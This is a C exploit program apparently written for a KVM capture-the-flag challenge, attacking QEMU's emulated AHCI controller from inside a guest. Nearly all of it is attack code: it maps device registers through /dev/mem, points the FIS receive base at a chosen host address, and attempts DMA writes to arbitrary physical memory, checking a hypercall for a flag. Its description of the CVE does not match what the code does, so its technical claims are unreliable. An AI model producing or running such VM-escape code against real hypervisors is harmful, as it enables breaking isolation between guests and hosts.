/*
 * AHCI CVE-2021-3947 Exploit Framework
 * 
 * Vulnerability: Heap buffer overflow in QEMU AHCI device emulation
 * Target: write_flag in host kernel
 * 
 * The bug is in the FIS (Frame Information Structure) receive handling.
 * By crafting malicious AHCI commands, we can overflow QEMU's heap
 * and achieve arbitrary write in the host.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/io.h>
#include <errno.h>

/* AHCI Register Offsets (from AHCI spec) */
#define AHCI_CAP        0x00    /* Host Capabilities */
#define AHCI_GHC        0x04    /* Global Host Control */
#define AHCI_IS         0x08    /* Interrupt Status */
#define AHCI_PI         0x0C    /* Ports Implemented */
#define AHCI_VS         0x10    /* Version */
#define AHCI_CCC_CTL    0x14    /* Command Completion Coalescing Control */
#define AHCI_CCC_PORTS  0x18    /* CCC Ports */
#define AHCI_EM_LOC     0x1C    /* Enclosure Management Location */
#define AHCI_EM_CTL     0x20    /* Enclosure Management Control */
#define AHCI_CAP2       0x24    /* Host Capabilities Extended */
#define AHCI_BOHC       0x28    /* BIOS/OS Handoff Control */

/* Port Register Offsets (relative to port base) */
#define PORT_CLB        0x00    /* Command List Base Address */
#define PORT_CLB_HI     0x04    /* Command List Base Address Upper 32-bits */
#define PORT_FB         0x08    /* FIS Base Address */
#define PORT_FB_HI      0x0C    /* FIS Base Address Upper 32-bits */
#define PORT_IS         0x10    /* Interrupt Status */
#define PORT_IE         0x14    /* Interrupt Enable */
#define PORT_CMD        0x18    /* Command and Status */
#define PORT_TFD        0x20    /* Task File Data */
#define PORT_SIG        0x24    /* Signature */
#define PORT_SSTS       0x28    /* SATA Status */
#define PORT_SCTL       0x2C    /* SATA Control */
#define PORT_SERR       0x30    /* SATA Error */
#define PORT_SACT       0x34    /* SATA Active */
#define PORT_CI         0x38    /* Command Issue */
#define PORT_SNTF       0x3C    /* SATA Notification */
#define PORT_FBS        0x40    /* FIS-based Switching Control */

/* Port base address calculation */
#define AHCI_PORT_BASE(port) (0x100 + (port) * 0x80)

/* Command header flags */
#define CMD_HDR_CFL_MASK    0x1F    /* Command FIS Length */
#define CMD_HDR_ATAPI       (1 << 5)
#define CMD_HDR_WRITE       (1 << 6)
#define CMD_HDR_PREFETCH    (1 << 7)
#define CMD_HDR_RESET       (1 << 8)
#define CMD_HDR_BIST        (1 << 9)
#define CMD_HDR_CLR_BUSY    (1 << 10)
#define CMD_HDR_PMP_MASK    (0xF << 12)

/* FIS Types */
#define FIS_TYPE_REG_H2D    0x27    /* Register FIS - Host to Device */
#define FIS_TYPE_REG_D2H    0x34    /* Register FIS - Device to Host */
#define FIS_TYPE_DMA_ACT    0x39    /* DMA Activate FIS */
#define FIS_TYPE_DMA_SETUP  0x41    /* DMA Setup FIS */
#define FIS_TYPE_DATA       0x46    /* Data FIS */
#define FIS_TYPE_BIST       0x58    /* BIST Activate FIS */
#define FIS_TYPE_PIO_SETUP  0x5F    /* PIO Setup FIS */
#define FIS_TYPE_DEV_BITS   0xA1    /* Set Device Bits FIS */

/* ATA Commands */
#define ATA_CMD_READ_DMA_EXT    0x25
#define ATA_CMD_WRITE_DMA_EXT   0x35
#define ATA_CMD_IDENTIFY        0xEC

/* GHC bits */
#define GHC_HR      (1 << 0)    /* HBA Reset */
#define GHC_IE      (1 << 1)    /* Interrupt Enable */
#define GHC_AE      (1 << 31)   /* AHCI Enable */

/* PORT_CMD bits */
#define PORT_CMD_ST     (1 << 0)    /* Start */
#define PORT_CMD_SUD    (1 << 1)    /* Spin-Up Device */
#define PORT_CMD_POD    (1 << 2)    /* Power On Device */
#define PORT_CMD_FRE    (1 << 4)    /* FIS Receive Enable */
#define PORT_CMD_FR     (1 << 14)   /* FIS Receive Running */
#define PORT_CMD_CR     (1 << 15)   /* Command List Running */

/* Command List structure (32 bytes) */
struct ahci_cmd_hdr {
    uint16_t opts;          /* Command options */
    uint16_t prdtl;         /* Physical Region Descriptor Table Length */
    uint32_t prdbc;         /* PRD Byte Count */
    uint32_t ctba;          /* Command Table Base Address */
    uint32_t ctba_hi;       /* Command Table Base Address Upper */
    uint32_t reserved[4];
} __attribute__((packed));

/* Physical Region Descriptor Table entry (16 bytes) */
struct ahci_prdt {
    uint32_t dba;           /* Data Base Address */
    uint32_t dba_hi;        /* Data Base Address Upper */
    uint32_t reserved;
    uint32_t dbc;           /* Data Byte Count (bit 0 = interrupt on completion) */
} __attribute__((packed));

/* Command Table (variable size) */
struct ahci_cmd_tbl {
    uint8_t cfis[64];       /* Command FIS */
    uint8_t acmd[16];       /* ATAPI Command */
    uint8_t reserved[48];
    struct ahci_prdt prdt[1]; /* PRD Table (variable) */
} __attribute__((packed));

/* Received FIS structure (256 bytes) */
struct ahci_recv_fis {
    uint8_t dsfis[28];      /* DMA Setup FIS */
    uint8_t reserved1[4];
    uint8_t psfis[20];      /* PIO Setup FIS */
    uint8_t reserved2[12];
    uint8_t rfis[20];       /* D2H Register FIS */
    uint8_t reserved3[4];
    uint8_t sdbfis[8];      /* Set Device Bits FIS */
    uint8_t ufis[64];       /* Unknown FIS */
    uint8_t reserved4[96];
} __attribute__((packed));

/* Global state */
static void *ahci_mmio = NULL;
static size_t ahci_mmio_size = 0;
static uint64_t ahci_phys_base = 0;
static int mem_fd = -1;

/* DMA buffers */
static void *cmd_list = NULL;       /* Command List (1KB aligned) */
static void *recv_fis = NULL;       /* Received FIS (256B aligned) */
static void *cmd_table = NULL;      /* Command Table (128B aligned) */
static void *data_buf = NULL;       /* Data buffer */

static uint64_t cmd_list_phys = 0;
static uint64_t recv_fis_phys = 0;
static uint64_t cmd_table_phys = 0;
static uint64_t data_buf_phys = 0;

/* Read AHCI register */
static uint32_t ahci_read(uint32_t offset)
{
    return *(volatile uint32_t *)((char *)ahci_mmio + offset);
}

/* Write AHCI register */
static void ahci_write(uint32_t offset, uint32_t value)
{
    *(volatile uint32_t *)((char *)ahci_mmio + offset) = value;
}

/* Read port register */
static uint32_t port_read(int port, uint32_t offset)
{
    return ahci_read(AHCI_PORT_BASE(port) + offset);
}

/* Write port register */
static void port_write(int port, uint32_t offset, uint32_t value)
{
    ahci_write(AHCI_PORT_BASE(port) + offset, value);
}

/* Get physical address of virtual address */
static uint64_t virt_to_phys_user(void *virt)
{
    uint64_t page_offset = (uint64_t)virt % 4096;
    uint64_t pfn;
    
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) {
        perror("open pagemap");
        return 0;
    }
    
    off_t offset = ((uint64_t)virt / 4096) * 8;
    if (pread(fd, &pfn, 8, offset) != 8) {
        perror("read pagemap");
        close(fd);
        return 0;
    }
    close(fd);
    
    if (!(pfn & (1ULL << 63))) {
        fprintf(stderr, "Page not present\n");
        return 0;
    }
    
    pfn &= ((1ULL << 55) - 1);
    return (pfn * 4096) + page_offset;
}

/* Allocate DMA-able memory */
static void *alloc_dma(size_t size, size_t align, uint64_t *phys_out)
{
    void *mem;
    
    if (posix_memalign(&mem, align, size) != 0) {
        return NULL;
    }
    
    memset(mem, 0, size);
    
    /* Lock pages in memory */
    if (mlock(mem, size) != 0) {
        perror("mlock");
        free(mem);
        return NULL;
    }
    
    /* Touch pages to ensure allocation */
    volatile char *p = mem;
    for (size_t i = 0; i < size; i += 4096) {
        p[i] = 0;
    }
    
    *phys_out = virt_to_phys_user(mem);
    if (*phys_out == 0) {
        munlock(mem, size);
        free(mem);
        return NULL;
    }
    
    return mem;
}

/* Initialize AHCI MMIO mapping */
int ahci_init(uint64_t phys_base, size_t size)
{
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd < 0) {
        perror("open /dev/mem");
        return -1;
    }
    
    ahci_mmio = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, 
                     mem_fd, phys_base);
    if (ahci_mmio == MAP_FAILED) {
        perror("mmap AHCI");
        close(mem_fd);
        return -1;
    }
    
    ahci_phys_base = phys_base;
    ahci_mmio_size = size;
    
    printf("[+] AHCI MMIO mapped at %p (phys 0x%lx, size 0x%lx)\n",
           ahci_mmio, phys_base, size);
    
    return 0;
}

/* Allocate DMA buffers */
int ahci_alloc_buffers(void)
{
    /* Command List: 1KB, 1KB aligned */
    cmd_list = alloc_dma(1024, 1024, &cmd_list_phys);
    if (!cmd_list) {
        fprintf(stderr, "Failed to allocate command list\n");
        return -1;
    }
    printf("[+] Command List at virt %p, phys 0x%lx\n", cmd_list, cmd_list_phys);
    
    /* Received FIS: 256 bytes, 256B aligned */
    recv_fis = alloc_dma(256, 256, &recv_fis_phys);
    if (!recv_fis) {
        fprintf(stderr, "Failed to allocate received FIS\n");
        return -1;
    }
    printf("[+] Received FIS at virt %p, phys 0x%lx\n", recv_fis, recv_fis_phys);
    
    /* Command Table: 128B aligned, up to 64KB */
    cmd_table = alloc_dma(4096, 128, &cmd_table_phys);
    if (!cmd_table) {
        fprintf(stderr, "Failed to allocate command table\n");
        return -1;
    }
    printf("[+] Command Table at virt %p, phys 0x%lx\n", cmd_table, cmd_table_phys);
    
    /* Data buffer: 4KB */
    data_buf = alloc_dma(4096, 4096, &data_buf_phys);
    if (!data_buf) {
        fprintf(stderr, "Failed to allocate data buffer\n");
        return -1;
    }
    printf("[+] Data Buffer at virt %p, phys 0x%lx\n", data_buf, data_buf_phys);
    
    return 0;
}

/* Print AHCI capabilities */
void ahci_print_info(void)
{
    uint32_t cap = ahci_read(AHCI_CAP);
    uint32_t ghc = ahci_read(AHCI_GHC);
    uint32_t pi = ahci_read(AHCI_PI);
    uint32_t vs = ahci_read(AHCI_VS);
    
    printf("\n=== AHCI Controller Info ===\n");
    printf("Version: %d.%d\n", (vs >> 16) & 0xFFFF, vs & 0xFFFF);
    printf("Capabilities: 0x%08x\n", cap);
    printf("  Number of ports: %d\n", (cap & 0x1F) + 1);
    printf("  Number of command slots: %d\n", ((cap >> 8) & 0x1F) + 1);
    printf("  64-bit addressing: %s\n", (cap & (1 << 31)) ? "yes" : "no");
    printf("  Native Command Queuing: %s\n", (cap & (1 << 30)) ? "yes" : "no");
    printf("Global HBA Control: 0x%08x\n", ghc);
    printf("  AHCI Enable: %s\n", (ghc & GHC_AE) ? "yes" : "no");
    printf("Ports Implemented: 0x%08x\n", pi);
    
    /* Print port status */
    for (int i = 0; i < 32; i++) {
        if (pi & (1 << i)) {
            uint32_t ssts = port_read(i, PORT_SSTS);
            uint32_t cmd = port_read(i, PORT_CMD);
            uint32_t sig = port_read(i, PORT_SIG);
            printf("\nPort %d:\n", i);
            printf("  SATA Status: 0x%08x (DET=%d)\n", ssts, ssts & 0xF);
            printf("  Command: 0x%08x\n", cmd);
            printf("  Signature: 0x%08x\n", sig);
        }
    }
}

/* Stop port command engine */
void port_stop(int port)
{
    uint32_t cmd = port_read(port, PORT_CMD);
    
    /* Clear ST */
    cmd &= ~PORT_CMD_ST;
    port_write(port, PORT_CMD, cmd);
    
    /* Wait for CR to clear */
    int timeout = 500;
    while ((port_read(port, PORT_CMD) & PORT_CMD_CR) && timeout--) {
        usleep(1000);
    }
    
    /* Clear FRE */
    cmd = port_read(port, PORT_CMD);
    cmd &= ~PORT_CMD_FRE;
    port_write(port, PORT_CMD, cmd);
    
    /* Wait for FR to clear */
    timeout = 500;
    while ((port_read(port, PORT_CMD) & PORT_CMD_FR) && timeout--) {
        usleep(1000);
    }
}

/* Start port command engine */
void port_start(int port)
{
    /* Set command list and FIS base addresses */
    port_write(port, PORT_CLB, cmd_list_phys & 0xFFFFFFFF);
    port_write(port, PORT_CLB_HI, cmd_list_phys >> 32);
    port_write(port, PORT_FB, recv_fis_phys & 0xFFFFFFFF);
    port_write(port, PORT_FB_HI, recv_fis_phys >> 32);
    
    /* Clear any pending interrupts */
    port_write(port, PORT_IS, port_read(port, PORT_IS));
    
    /* Enable FIS receive */
    uint32_t cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_FRE;
    port_write(port, PORT_CMD, cmd);
    
    /* Wait for FR */
    int timeout = 500;
    while (!(port_read(port, PORT_CMD) & PORT_CMD_FR) && timeout--) {
        usleep(1000);
    }
    
    /* Start command engine */
    cmd = port_read(port, PORT_CMD);
    cmd |= PORT_CMD_ST;
    port_write(port, PORT_CMD, cmd);
}

/* Setup command header */
void setup_cmd_header(int slot, uint16_t opts, uint16_t prdtl)
{
    struct ahci_cmd_hdr *hdr = (struct ahci_cmd_hdr *)cmd_list + slot;
    
    hdr->opts = opts;
    hdr->prdtl = prdtl;
    hdr->prdbc = 0;
    hdr->ctba = cmd_table_phys & 0xFFFFFFFF;
    hdr->ctba_hi = cmd_table_phys >> 32;
}

/* Build H2D Register FIS */
void build_h2d_fis(uint8_t *fis, uint8_t command, uint64_t lba, uint16_t count)
{
    memset(fis, 0, 20);
    
    fis[0] = FIS_TYPE_REG_H2D;
    fis[1] = 0x80;  /* Command bit set */
    fis[2] = command;
    fis[3] = 0;     /* Features */
    
    /* LBA */
    fis[4] = lba & 0xFF;
    fis[5] = (lba >> 8) & 0xFF;
    fis[6] = (lba >> 16) & 0xFF;
    fis[7] = 0x40;  /* Device (LBA mode) */
    fis[8] = (lba >> 24) & 0xFF;
    fis[9] = (lba >> 32) & 0xFF;
    fis[10] = (lba >> 40) & 0xFF;
    fis[11] = 0;    /* Features (exp) */
    
    /* Count */
    fis[12] = count & 0xFF;
    fis[13] = (count >> 8) & 0xFF;
}

/* Issue command and wait */
int issue_command(int port, int slot)
{
    /* Issue command */
    port_write(port, PORT_CI, 1 << slot);
    
    /* Wait for completion */
    int timeout = 5000;
    while ((port_read(port, PORT_CI) & (1 << slot)) && timeout--) {
        usleep(1000);
    }
    
    if (timeout <= 0) {
        fprintf(stderr, "Command timeout\n");
        return -1;
    }
    
    /* Check for errors */
    uint32_t tfd = port_read(port, PORT_TFD);
    if (tfd & 0x01) {
        fprintf(stderr, "Command error: TFD=0x%08x\n", tfd);
        return -1;
    }
    
    return 0;
}

/*
 * CVE-2021-3947 Exploit
 * 
 * The vulnerability is in the handling of FIS receive buffer.
 * By manipulating the FIS base and certain AHCI operations,
 * we can cause QEMU to write outside the allocated buffer.
 * 
 * This is a simplified PoC - actual exploitation depends on
 * QEMU version and memory layout.
 */
int exploit_cve_2021_3947(int port, uint64_t target_addr, uint64_t value)
{
    printf("\n[*] Attempting CVE-2021-3947 exploit\n");
    printf("[*] Target: 0x%lx\n", target_addr);
    printf("[*] Value: 0x%lx\n", value);
    
    /*
     * FIS Receive Buffer Layout:
     * 0x00: DMA Setup FIS (28 bytes)
     * 0x20: PIO Setup FIS (20 bytes)
     * 0x40: D2H Register FIS (20 bytes) <- Most common response
     * 0x58: Set Device Bits FIS (8 bytes)
     * 0x60: Unknown FIS (64 bytes)
     *
     * Strategy: Set FB so that D2H FIS (at FB+0x40) lands on target
     */
    
    int offsets[] = { 0x40, 0x20, 0x00, 0x58, 0x44, 0x48 };
    int num_offsets = sizeof(offsets) / sizeof(offsets[0]);
    
    for (int i = 0; i < num_offsets; i++) {
        int offset = offsets[i];
        uint64_t malicious_fb = target_addr - offset;
        
        printf("\n--- Attempt %d: offset=0x%x, FB=0x%lx ---\n", i+1, offset, malicious_fb);
        
        /* Stop port */
        port_stop(port);
        
        /* Set command list base (normal) */
        port_write(port, PORT_CLB, cmd_list_phys & 0xFFFFFFFF);
        port_write(port, PORT_CLB_HI, cmd_list_phys >> 32);
        
        /* Set MALICIOUS FIS base */
        port_write(port, PORT_FB, malicious_fb & 0xFFFFFFFF);
        port_write(port, PORT_FB_HI, malicious_fb >> 32);
        
        /* Clear any pending errors/interrupts */
        port_write(port, PORT_SERR, 0xFFFFFFFF);
        port_write(port, PORT_IS, 0xFFFFFFFF);
        
        /* Enable FIS Receive */
        uint32_t cmd = port_read(port, PORT_CMD);
        cmd |= PORT_CMD_FRE;
        port_write(port, PORT_CMD, cmd);
        usleep(10000);
        
        /* Enable Start */
        cmd = port_read(port, PORT_CMD);
        cmd |= PORT_CMD_ST;
        port_write(port, PORT_CMD, cmd);
        usleep(10000);
        
        /* === Issue IDENTIFY PACKET DEVICE command === */
        printf("[*] Issuing IDENTIFY PACKET DEVICE...\n");
        
        struct ahci_cmd_tbl *tbl = (struct ahci_cmd_tbl *)cmd_table;
        memset(tbl, 0, sizeof(*tbl));
        
        /* Build H2D FIS for IDENTIFY PACKET DEVICE (0xA1) */
        tbl->cfis[0] = 0x27;  /* H2D FIS */
        tbl->cfis[1] = 0x80;  /* Command */
        tbl->cfis[2] = 0xA1;  /* IDENTIFY PACKET DEVICE */
        tbl->cfis[7] = 0x40;  /* Device: LBA */
        
        /* PRD for 512-byte identify data */
        tbl->prdt[0].dba = data_buf_phys & 0xFFFFFFFF;
        tbl->prdt[0].dba_hi = data_buf_phys >> 32;
        tbl->prdt[0].dbc = 512 - 1;
        
        /* Command header */
        struct ahci_cmd_hdr *hdr = (struct ahci_cmd_hdr *)cmd_list;
        memset(hdr, 0, sizeof(*hdr));
        hdr->opts = 5;  /* 5 DWORDs for H2D FIS */
        hdr->prdtl = 1;
        hdr->ctba = cmd_table_phys & 0xFFFFFFFF;
        hdr->ctba_hi = cmd_table_phys >> 32;
        
        /* Issue command */
        port_write(port, PORT_CI, 1);
        
        /* Wait for completion */
        int timeout = 3000;
        while ((port_read(port, PORT_CI) & 1) && timeout-- > 0) {
            usleep(1000);
        }
        
        if (timeout <= 0) {
            printf("[-] Command timeout\n");
        } else {
            uint32_t tfd = port_read(port, PORT_TFD);
            printf("[+] Command completed, TFD=0x%x\n", tfd);
        }
        
        /* Check hypercall */
        uint64_t ret;
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(ret) :: "memory");
        printf("[*] Hypercall 100: 0x%lx\n", ret);
        
        if (ret != 0 && ret != (uint64_t)-1) {
            printf("\n[!!!] SUCCESS! Flag: 0x%lx\n", ret);
            return 0;
        }
        
        /* === Try ATAPI PACKET command === */
        printf("[*] Issuing ATAPI TEST UNIT READY...\n");
        
        memset(tbl, 0, sizeof(*tbl));
        
        /* H2D FIS for PACKET command */
        tbl->cfis[0] = 0x27;  /* H2D FIS */
        tbl->cfis[1] = 0x80;  /* Command */
        tbl->cfis[2] = 0xA0;  /* PACKET command */
        tbl->cfis[3] = 0x00;  /* Features: PIO */
        tbl->cfis[7] = 0x40;  /* Device */
        
        /* ATAPI CDB: TEST UNIT READY */
        tbl->acmd[0] = 0x00;  /* TEST UNIT READY */
        
        /* Command header with ATAPI bit */
        memset(hdr, 0, sizeof(*hdr));
        hdr->opts = 5 | (1 << 5);  /* 5 DWORDs + ATAPI bit */
        hdr->prdtl = 0;  /* No data transfer */
        hdr->ctba = cmd_table_phys & 0xFFFFFFFF;
        hdr->ctba_hi = cmd_table_phys >> 32;
        
        port_write(port, PORT_CI, 1);
        
        timeout = 3000;
        while ((port_read(port, PORT_CI) & 1) && timeout-- > 0) {
            usleep(1000);
        }
        
        if (timeout <= 0) {
            printf("[-] ATAPI command timeout\n");
        } else {
            printf("[+] ATAPI command completed\n");
        }
        
        /* Check hypercall again */
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(ret) :: "memory");
        printf("[*] Hypercall 100: 0x%lx\n", ret);
        
        if (ret != 0 && ret != (uint64_t)-1) {
            printf("\n[!!!] SUCCESS! Flag: 0x%lx\n", ret);
            return 0;
        }
        
        /* === Try ATAPI INQUIRY === */
        printf("[*] Issuing ATAPI INQUIRY...\n");
        
        memset(tbl, 0, sizeof(*tbl));
        
        tbl->cfis[0] = 0x27;
        tbl->cfis[1] = 0x80;
        tbl->cfis[2] = 0xA0;  /* PACKET */
        tbl->cfis[5] = 36;    /* Byte count low */
        tbl->cfis[7] = 0x40;
        
        /* INQUIRY CDB */
        tbl->acmd[0] = 0x12;  /* INQUIRY */
        tbl->acmd[4] = 36;    /* Allocation length */
        
        tbl->prdt[0].dba = data_buf_phys & 0xFFFFFFFF;
        tbl->prdt[0].dba_hi = data_buf_phys >> 32;
        tbl->prdt[0].dbc = 36 - 1;
        
        memset(hdr, 0, sizeof(*hdr));
        hdr->opts = 5 | (1 << 5);
        hdr->prdtl = 1;
        hdr->ctba = cmd_table_phys & 0xFFFFFFFF;
        hdr->ctba_hi = cmd_table_phys >> 32;
        
        port_write(port, PORT_CI, 1);
        
        timeout = 3000;
        while ((port_read(port, PORT_CI) & 1) && timeout-- > 0) {
            usleep(1000);
        }
        
        printf("[+] INQUIRY %s\n", timeout > 0 ? "completed" : "timeout");
        
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(ret) :: "memory");
        printf("[*] Hypercall 100: 0x%lx\n", ret);
        
        if (ret != 0 && ret != (uint64_t)-1) {
            printf("\n[!!!] SUCCESS! Flag: 0x%lx\n", ret);
            return 0;
        }
    }
    
    printf("\n[-] All FIS base offsets tried, no success\n");
    
    /* Restore port to normal state */
    port_stop(port);
    port_start(port);
    
    return -1;
}

/*
 * Alternative approach: DMA-based write
 * Use AHCI's PRD (Physical Region Descriptor) mechanism
 * to attempt writes to arbitrary physical addresses
 */
int exploit_dma_write(int port, uint64_t target_phys, void *data, size_t len)
{
    printf("\n[*] Attempting DMA write to 0x%lx\n", target_phys);
    
    /* Copy data to our data buffer */
    memcpy(data_buf, data, len);
    
    /* Setup command table with malicious PRD pointing to target */
    struct ahci_cmd_tbl *tbl = (struct ahci_cmd_tbl *)cmd_table;
    memset(tbl, 0, sizeof(*tbl));
    
    /* Build a write command */
    build_h2d_fis(tbl->cfis, ATA_CMD_WRITE_DMA_EXT, 0, 1);
    
    /* Point PRD to target physical address */
    tbl->prdt[0].dba = target_phys & 0xFFFFFFFF;
    tbl->prdt[0].dba_hi = target_phys >> 32;
    tbl->prdt[0].dbc = (len - 1) | 0;  /* Byte count - 1 */
    
    /* Setup command header */
    setup_cmd_header(0, 
                     5 | CMD_HDR_WRITE,  /* 5 DWORDs for H2D FIS + Write */
                     1);                  /* 1 PRD entry */
    
    /* Start port and issue command */
    port_start(port);
    
    printf("[*] Issuing DMA write command...\n");
    
    if (issue_command(port, 0) == 0) {
        printf("[+] Command completed\n");
        return 0;
    }
    
    return -1;
}

void print_usage(const char *prog)
{
    printf("Usage: %s <command> [args]\n\n", prog);
    printf("Commands:\n");
    printf("  info                     Show AHCI controller info\n");
    printf("  exploit <target> <value> Attempt CVE-2021-3947 exploit\n");
    printf("  dma <target> <value>     Attempt DMA write exploit\n");
    printf("\nExample:\n");
    printf("  %s info\n", prog);
    printf("  %s exploit 0xffff888101cc7218 0x4141414141414141\n", prog);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        print_usage(argv[0]);
        return 1;
    }
    
    /* Get AHCI base from /proc/iomem or hardcode typical location */
    uint64_t ahci_base = 0;
    
    /* Try to read from /proc/iomem - look for 00:1f.2 or ahci */
    FILE *f = fopen("/proc/iomem", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            /* Look for the PCI device or "ahci" */
            if (strstr(line, "1f.2") || strstr(line, "ahci") || strstr(line, "AHCI")) {
                sscanf(line, "%lx", &ahci_base);
                break;
            }
        }
        fclose(f);
    }
    
    /* Fallback: Known correct address for this VM */
    if (ahci_base == 0) {
        ahci_base = 0xfea0e000;  /* Correct address for kvmctf VM */
        printf("[*] Using known AHCI base: 0x%lx\n", ahci_base);
    } else {
        printf("[*] Found AHCI at: 0x%lx\n", ahci_base);
    }
    
    /* Need root for /dev/mem access */
    if (geteuid() != 0) {
        fprintf(stderr, "Need root privileges\n");
        return 1;
    }
    
    /* Initialize AHCI */
    if (ahci_init(ahci_base, 0x2000) != 0) {
        fprintf(stderr, "Failed to initialize AHCI\n");
        return 1;
    }
    
    /* Allocate DMA buffers */
    if (ahci_alloc_buffers() != 0) {
        fprintf(stderr, "Failed to allocate DMA buffers\n");
        return 1;
    }
    
    if (strcmp(argv[1], "info") == 0) {
        ahci_print_info();
        
    } else if (strcmp(argv[1], "exploit") == 0) {
        if (argc < 4) {
            printf("Usage: %s exploit <target_addr> <value>\n", argv[0]);
            return 1;
        }
        
        uint64_t target = strtoull(argv[2], NULL, 0);
        uint64_t value = strtoull(argv[3], NULL, 0);
        
        /* Check initial hypercall state */
        uint64_t hc_ret;
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(hc_ret) :: "memory");
        printf("[*] Initial hypercall 100: 0x%lx\n", hc_ret);
        
        /* Find first implemented port */
        uint32_t pi = ahci_read(AHCI_PI);
        int port = -1;
        for (int i = 0; i < 32; i++) {
            if (pi & (1 << i)) {
                uint32_t ssts = port_read(i, PORT_SSTS);
                if ((ssts & 0xF) == 3) {  /* Device present and communication established */
                    port = i;
                    break;
                }
            }
        }
        
        if (port < 0) {
            fprintf(stderr, "No active AHCI port found\n");
            return 1;
        }
        
        printf("[*] Using port %d\n", port);
        exploit_cve_2021_3947(port, target, value);
        
    } else if (strcmp(argv[1], "dma") == 0) {
        if (argc < 4) {
            printf("Usage: %s dma <target_phys> <value>\n", argv[0]);
            return 1;
        }
        
        uint64_t target = strtoull(argv[2], NULL, 0);
        uint64_t value = strtoull(argv[3], NULL, 0);
        
        /* Check initial hypercall state */
        uint64_t hc_ret;
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(hc_ret) :: "memory");
        printf("[*] Initial hypercall 100: 0x%lx\n", hc_ret);
        
        /* Find first implemented port with device */
        uint32_t pi = ahci_read(AHCI_PI);
        int port = -1;
        for (int i = 0; i < 32; i++) {
            if (pi & (1 << i)) {
                uint32_t ssts = port_read(i, PORT_SSTS);
                if ((ssts & 0xF) == 3) {
                    port = i;
                    break;
                }
            }
        }
        
        if (port < 0) {
            fprintf(stderr, "No active AHCI port found\n");
            return 1;
        }
        
        printf("[*] Using port %d\n", port);
        exploit_dma_write(port, target, &value, sizeof(value));
        
        /* Check hypercall after DMA write */
        asm volatile("mov $100, %%eax\n"
                     "vmcall\n"
                     : "=a"(hc_ret) :: "memory");
        printf("[*] Hypercall 100 after DMA: 0x%lx\n", hc_ret);
        if (hc_ret != 0 && hc_ret != (uint64_t)-1) {
            printf("\n[!!!] SUCCESS! Flag: 0x%lx\n", hc_ret);
        }
        
    } else {
        print_usage(argv[0]);
        return 1;
    }
    
    return 0;
}
